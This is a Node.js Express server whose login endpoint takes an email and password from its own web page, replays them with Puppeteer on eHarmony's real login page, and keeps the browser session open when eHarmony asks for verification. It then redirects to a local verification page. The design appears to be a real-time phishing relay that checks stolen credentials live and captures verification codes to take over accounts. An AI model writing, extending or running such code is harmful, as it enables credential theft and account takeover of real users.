const express = require("express");
const cors = require("cors");
const puppeteer = require("puppeteer");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (HTML, CSS, JS)
app.use(express.static("."));

// Login endpoint
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({
      success: false,
      error: "Email and password are required",
    });
  }

  let browser;
  let keepBrowserOpen = false; // Track if browser should stay open
  try {
    console.log(`Starting login process for: ${email}`);

    // Launch Puppeteer
    browser = await puppeteer.launch({
      headless: false, // Set to true for production
      defaultViewport: null,
      args: ["--start-maximized"],
    });

    const page = await browser.newPage();

    // Navigate to eHarmony login page
    await page.goto("https://www.eharmony.com/login/", {
      waitUntil: "networkidle2",
    });

    // Wait for the login form to load (using more flexible selectors)
    await page.waitForSelector(
      'input[type="email"], input[name="email"], #email, #loginFormEmail',
      {
        visible: true,
        timeout: 10000,
      }
    );

    // Wait for password field
    await page.waitForSelector(
      'input[type="password"], input[name="password"], #password, #loginFormPasswort',
      {
        visible: true,
        timeout: 10000,
      }
    );

    // Fill in the email (try multiple selectors)
    console.log("Filling in email...");
    const emailSelectors = [
      "#loginFormEmail",
      'input[type="email"]',
      'input[name="email"]',
      "#email",
    ];
    for (const selector of emailSelectors) {
      try {
        await page.type(selector, email);
        break;
      } catch (e) {
        console.log(`Email selector ${selector} not found, trying next...`);
      }
    }

    // Fill in the password (try multiple selectors)
    console.log("Filling in password...");
    const passwordSelectors = [
      "#loginFormPasswort",
      'input[type="password"]',
      'input[name="password"]',
      "#password",
    ];
    for (const selector of passwordSelectors) {
      try {
        await page.type(selector, password);
        break;
      } catch (e) {
        console.log(`Password selector ${selector} not found, trying next...`);
      }
    }

    // Click the login button (try multiple selectors)
    console.log("Clicking login button...");
    const buttonSelectors = [
      "#loginFormSubmit",
      'button[type="submit"]',
      'input[type="submit"]',
      ".login-button",
      "#login-button",
    ];
    for (const selector of buttonSelectors) {
      try {
        await page.click(selector);
        break;
      } catch (e) {
        console.log(`Button selector ${selector} not found, trying next...`);
      }
    }

    // Wait 5 seconds and check URL
    console.log("Waiting 5 seconds to check URL...");
    await new Promise((resolve) => setTimeout(resolve, 5000));

    const currentUrl = page.url();
    console.log("Current URL after 5 seconds:", currentUrl);

    // Check if URL contains login_error=1 (incorrect credentials)
    const hasLoginError = currentUrl.includes("login_error=1");
    const needsVerification = currentUrl.includes("user_verification");

    if (hasLoginError) {
      console.log(
        "Login failed - detected login_error=1 in URL (incorrect credentials)"
      );
      res.json({
        success: false,
        message: "Login failed - incorrect email or password",
        currentUrl: currentUrl,
        hasLoginError: true,
      });
    } else if (needsVerification) {
      console.log(
        "Login requires verification - detected user_verification in URL"
      );
      console.log("Keeping Puppeteer browser open for verification...");

      let verificationEmailText = null;
      try {
        await page.waitForSelector("#email", { visible: true, timeout: 1000 });
        verificationEmailText = await page.$eval("#email", (el) =>
          el.textContent.trim()
        );
        console.log(">>> div#email text:", verificationEmailText);
      } catch (err) {
        console.log("div#email not found on main page:", err.message);
      }

      const encodedEmail = verificationEmailText 
      ? Buffer.from(verificationEmailText).toString('base64') 
      : '';

      keepBrowserOpen = true; // Mark browser to stay open
      res.json({
        success: true,
        message: "Login requires verification - browser kept open",
        currentUrl: currentUrl,
        needsVerification: true,
        redirectTo: `/user-verification.html?email=${encodedEmail}`
      });
      // Don't close the browser - let it stay open for verification
      return;
    } else {
      console.log("Login successful - no login_error detected");
      res.json({
        success: true,
        message: "Login successful",
        currentUrl: currentUrl,
      });
    }
  } catch (error) {
    console.error("Error during login process:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error during login process",
      details: error.message,
    });
  } finally {
    // Only close the browser if it shouldn't be kept open
    if (browser && !keepBrowserOpen) {
      setTimeout(async () => {
        await browser.close();
        console.log("Browser closed");
      }, 5000); // Wait 5 seconds before closing
    } else if (browser && keepBrowserOpen) {
      console.log("Browser kept open for verification process");
    }
  }
});



// Health check endpoint
app.get("/api/health", (req, res) => {
  res.json({ status: "OK", message: "Server is running" });
});

// Serve the main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/api/health`);
});
